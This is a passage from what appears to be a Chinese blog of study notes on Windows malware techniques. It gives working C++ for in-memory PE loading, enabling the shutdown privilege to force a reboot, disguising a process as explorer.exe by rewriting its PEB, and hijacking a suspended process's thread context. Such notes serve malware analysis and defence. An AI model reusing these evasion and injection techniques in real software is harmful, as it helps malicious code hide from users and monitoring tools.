class="string">&quot;WriteProcessMemory Failed !!! %d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//for循环写每个节区，BaseAddress + pISH-&gt;VirtualAddress代表每个节区在内存中的位置，pbuf + pISH-&gt;PointerToRawData代表在文件中的位置</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dSectionNum; i++, pISH++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBaseAddress + pISH-&gt;VirtualAddress), pbuf + pISH-&gt;PointerToRawData, pISH-&gt;SizeOfRawData, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!!  %d&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DoRelocationTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)((DWORD)lpBaseAddress + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	PIMAGE_BASE_RELOCATION  PBR = (PIMAGE_BASE_RELOCATION)((DWORD)lpBaseAddress + pIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress);</span><br><span class="line">	</span><br><span class="line">	DWORD dwImageBase = pIOH-&gt;ImageBase;</span><br><span class="line">	<span class="keyword">if</span> (pIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//没有重定位表</span></span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (PBR-&gt;VirtualAddress != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		DWORD RvaofBlock = PBR-&gt;VirtualAddress;</span><br><span class="line">		<span class="comment">//定义成一个WORD的指针，方便取值计算</span></span><br><span class="line">		WORD* RvaArrays = (WORD*)((DWORD)PBR + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">		<span class="comment">//算出这个重定位表块需要修改多少个RAV</span></span><br><span class="line">		<span class="keyword">int</span> NumofRva = (PBR-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//修改每个块中的重定位表信息</span></span><br><span class="line">		<span class="comment">//NumofRva-1是为了排除重定位表块最后的0000</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NumofRva<span class="number">-1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//32位程序一般Type就是3，也就是IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line">			DWORD* pAddr = (DWORD*)((DWORD)lpBaseAddress +( RvaArrays[i] &amp; <span class="number">0xfff</span>) + RvaofBlock);</span><br><span class="line">			*pAddr = *pAddr - dwImageBase + (DWORD)lpBaseAddress;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		PBR = (PIMAGE_BASE_RELOCATION)((DWORD)PBR + PBR-&gt;SizeOfBlock);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RepairIAT</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)((DWORD)lpBaseAddress + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR PIID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpBaseAddress + pIOH-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* DllName = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_IMPORT_BY_NAME FuctionName = <span class="literal">NULL</span>;</span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (; *(DWORD *)PIID !=<span class="number">0</span>; PIID++)</span><br><span class="line">	&#123;</span><br><span class="line">		DllName = (<span class="keyword">char</span>*)((DWORD)lpBaseAddress + PIID-&gt;Name);</span><br><span class="line">		<span class="comment">//hDll = GetModuleHandleA(DllName);</span></span><br><span class="line">		hDll = LoadLibraryA(DllName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		PIMAGE_THUNK_DATA RVAofNameArrays = (PIMAGE_THUNK_DATA)((DWORD)lpBaseAddress + PIID-&gt;OriginalFirstThunk);</span><br><span class="line">		PIMAGE_THUNK_DATA RVAofIatArrays = (PIMAGE_THUNK_DATA)((DWORD)lpBaseAddress + PIID-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; RVAofIatArrays[i].u1.Function!=<span class="number">0</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//前两个字节为Ordinal编号所以要加2</span></span><br><span class="line">			FuctionName = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpBaseAddress + RVAofNameArrays[i].u1.AddressOfData);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (RVAofNameArrays[i].u1.Ordinal&amp; <span class="number">0x80000000</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				RVAofIatArrays[i].u1.Function = (DWORD)GetProcAddress(hDll, (LPCSTR)(RVAofNameArrays[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				RVAofIatArrays[i].u1.Function = (DWORD)GetProcAddress(hDll, (LPCSTR)FuctionName-&gt;Name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%08x  &quot;</span>, RVAofIatArrays[i].u1.Function);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%08x  &quot;</span>, RVAofNameArrays[i].u1.Ordinal);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s  &quot;</span>, FuctionName-&gt;Name);</span><br><span class="line">			<span class="comment">//GetProcAddress(hDll, FuctionName)</span></span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Set</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)((DWORD)lpBaseAddress + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	LPVOID lpExeEntry = (LPVOID)((DWORD)lpBaseAddress + pIOH-&gt;AddressOfEntryPoint);</span><br><span class="line"></span><br><span class="line">	pIOH-&gt;ImageBase = (DWORD)lpBaseAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, lpExeEntry</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RunExe</span><span class="params">(PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	DWORD dImageSize = <span class="number">0</span>;</span><br><span class="line">	LPVOID lpBaseAddress;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//申请ImageSize大小的内存空间</span></span><br><span class="line">	dImageSize = pIOH-&gt;SizeOfImage;</span><br><span class="line">	lpBaseAddress = VirtualAlloc(<span class="literal">NULL</span>, dImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	RtlZeroMemory(lpBaseAddress, dImageSize);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//向申请的空间写入目标exe的pe映像</span></span><br><span class="line">	<span class="keyword">if</span> (ImageWrite(lpBaseAddress, pbuf) == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ImageWrite Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//重定位</span></span><br><span class="line">	DoRelocationTable(lpBaseAddress);</span><br><span class="line"></span><br><span class="line">	RepairIAT(lpBaseAddress);</span><br><span class="line"></span><br><span class="line">	Set(lpBaseAddress);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CHAR szExePath[MAX_PATH] = <span class="string">&quot;D:\\xor.exe&quot;</span>;</span><br><span class="line">	PBYTE buf;</span><br><span class="line"></span><br><span class="line">	ReadExeFile(szExePath,&amp;buf);</span><br><span class="line">	RunExe(buf);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行下，还是运行的PE映像切换的弹窗exe。<br><img src="https://s2.loli.net/2022/01/25/QFX5ubOrZE9dvTx.png"></p>
<h2 id="第六章-提权技术"><a href="#第六章-提权技术" class="headerlink" title="第六章-提权技术"></a>第六章-提权技术</h2><p>我们一般的用户就只有用户权限，在自删除技术中我们使用MoveFileEx，就只能利用管理员权限运行程序才能真正修改到注册表相应的位置，并且我们创建或者修改系统服务，修改HKEY_LOCL_MOCHINE注册表，ExitWindows关机的时候，都需要管理员权限，这也解决了当初我写MAZE病毒分析的时候，为什么仿写的关机部分没有成功的原因。也是为什么我们需要学习提权的原因。</p>
<h3 id="进程访问令牌权限提升"><a href="#进程访问令牌权限提升" class="headerlink" title="进程访问令牌权限提升"></a>进程访问令牌权限提升</h3><p>感觉都是套路操作了，也没讲原理。</p>
<p>Windows的常见权限<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN</a></p>
<p>下面代码申请了关机权限，实现了个关机程序</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnbalePrivileges</span><span class="params">(HANDLE hProcess, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* pszPrivilegesName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">	LUID luidValue = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄</span></span><br><span class="line">	bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span></span><br><span class="line">	bRet = LookupPrivilegeValue(<span class="literal">NULL</span>, pszPrivilegesName, &amp;luidValue);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置提升权限信息</span></span><br><span class="line">	tokenPrivileges.PrivilegeCount = <span class="number">1</span>; <span class="comment">//特权对应的数量</span></span><br><span class="line">	tokenPrivileges.Privileges[<span class="number">0</span>].Luid = luidValue;</span><br><span class="line">	tokenPrivileges.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<span class="comment">//启动该特权</span></span><br><span class="line">	<span class="comment">// 提升进程令牌访问权限</span></span><br><span class="line">	bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 根据错误码判断是否特权都设置成功</span></span><br><span class="line">		dwRet = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (ERROR_SUCCESS == dwRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//获取关机权限</span></span><br><span class="line">	EnbalePrivileges(GetCurrentProcess(), SE_SHUTDOWN_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关机并重启，原因为磁盘原因</span></span><br><span class="line">	ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第七章-隐藏技术"><a href="#第七章-隐藏技术" class="headerlink" title="第七章-隐藏技术"></a>第七章-隐藏技术</h2><h3 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h3><p>所谓进程伪装就是将进程的一些基本信息伪装成某些系统exe进程的信息，使其在任务管理器或者process monitor中看起来合理一点。</p>
<p>主要思路就是获取PEB结构体的地址，然后去修改PEB.processparameter这个结构体的内容。</p>
<p>我们来看看这个结构体的样子。</p>
<pre><code>typedef struct _RTL_USER_PROCESS_PARAMETERS &#123;
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;   //进程的图像文件的路径。
  UNICODE_STRING CommandLine;     //传递给进程的命令行字符串。
&#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</code></pre>
<p>我们要修改的就是ImagePathName，和ImagePathName。</p>
<p>但是这两个成员实际上也是UNICODE_STRING结构体。如下。</p>
<pre><code>typedef struct _UNICODE_STRING &#123;
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
&#125; UNICODE_STRING, *PUNICODE_STRING;</code></pre>
<p>所以我们修改的是ImagePathName.Buffer和ImagePathName.Buffer，可以看到是宽字符，所以我们修改的时候，也要用宽字符。</p>
<p>如果是找自己进程的PEB地址的方法有很多种，在windows反调试文章中已经介绍过了。</p>
<p>而查找指定进程的PEB就需要用到书中的一个函数NtQueryInformationProcess，将其第二个参数设置为ProcessBasicInformation，时就能返回PROCESS_BASIC_INFORMATION结构体信息，里面存储了PebBaseAddress的地址。 </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//由于本函数没有专门的库，所以需要自己定义下。</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* NTQUERYINFORMATIONPROCESS)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">	PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">	PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">	ULONG ProcessInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">	PULONG ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DisguiseProcess</span><span class="params">(HANDLE hProcess, WCHAR* wcImagePathName, WCHAR* wcCommandLine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTQUERYINFORMATIONPROCESS myNtQueryInformationProcess;</span><br><span class="line">	PROCESS_BASIC_INFORMATION PBI;</span><br><span class="line">	PEB peb;</span><br><span class="line">	RTL_USER_PROCESS_PARAMETERS RUPP;</span><br><span class="line">	<span class="keyword">int</span> CommandLinelenth;</span><br><span class="line">	<span class="keyword">int</span> ImagePathNamelenth;</span><br><span class="line"></span><br><span class="line">	myNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">	myNtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;PBI, <span class="keyword">sizeof</span>(PBI), <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取PEB结构体</span></span><br><span class="line">	peb = *(PBI.PebBaseAddress);</span><br><span class="line">	<span class="comment">//获取RTL_USER_PROCESS_PARAMETERS结构体</span></span><br><span class="line">	RUPP = *(peb.ProcessParameters);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//长度需要*2</span></span><br><span class="line">	CommandLinelenth = <span class="number">2</span> + <span class="number">2</span> * wcslen(wcCommandLine);</span><br><span class="line">	WriteProcessMemory(hProcess, RUPP.CommandLine.Buffer, wcCommandLine, CommandLinelenth, <span class="literal">NULL</span>);</span><br><span class="line">	WriteProcessMemory(hProcess, &amp;RUPP.CommandLine.Length, &amp;CommandLinelenth, <span class="keyword">sizeof</span>(CommandLinelenth), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	ImagePathNamelenth = <span class="number">2</span> + <span class="number">2</span> * wcslen(wcImagePathName);</span><br><span class="line">	WriteProcessMemory(hProcess, RUPP.ImagePathName.Buffer, wcImagePathName, ImagePathNamelenth, <span class="literal">NULL</span>);</span><br><span class="line">	WriteProcessMemory(hProcess, &amp;RUPP.CommandLine.Length, &amp;ImagePathNamelenth, <span class="keyword">sizeof</span>(ImagePathNamelenth), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line"></span><br><span class="line">	WCHAR CommandLine[MAX_PATH] = <span class="string">L&quot;c:\\windows\\system32\\explore.exe&quot;</span>;</span><br><span class="line">	WCHAR ImagePathName[MAX_PATH] = <span class="string">L&quot;c:\\windows\\system32\\explore.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">	hProcess=GetCurrentProcess();</span><br><span class="line">	DisguiseProcess(hProcess, ImagePathName, CommandLine);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的例子只能针对本进程，因为如果读取其他进程的PEB地址，用指针的方式会导致访问异常。如果想修改其他进程的话，必须用ReadProcessMemory来读取其他进程的PEB地址。</p>
<pre><code>// 获取指定进程进本信息结构中的PebBaseAddress
::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(peb), NULL);
// 获取指定进程环境块结构中的ProcessParameters, 注意指针指向的是指定进程空间中
::ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, sizeof(Param), NULL);</code></pre>
<h3 id="傀儡进程-自我创建"><a href="#傀儡进程-自我创建" class="headerlink" title="傀儡进程-自我创建"></a>傀儡进程-自我创建</h3><p>书上的这种傀儡进程实际上就是自我创建，和《逆向工程核心原理》中55章内容差不多。实际上可以用来作为反调试的一种方式，但是很容易绕过。</p>
<p>下面的例子和书上实际上差不多，只是书上是用的shellcode，然后写入了父进程，并申请为可执行的空间。而我的例子只是把新ip变成了一个函数的地址。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TRUEProc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;this is the true place&quot;</span>,<span class="string">&quot;The_Itach1&quot;</span>,MB_OK);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateMyself</span><span class="params">(CHAR* szFilePath, PVOID ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFOA si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">	CreateProcessA(szFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	ctx.Eip = (DWORD)ptr;</span><br><span class="line">	</span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	</span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CHAR Filename[MAX_PATH];</span><br><span class="line">	PVOID ptr= TRUEProc;</span><br><span class="line">	GetModuleFileNameA(<span 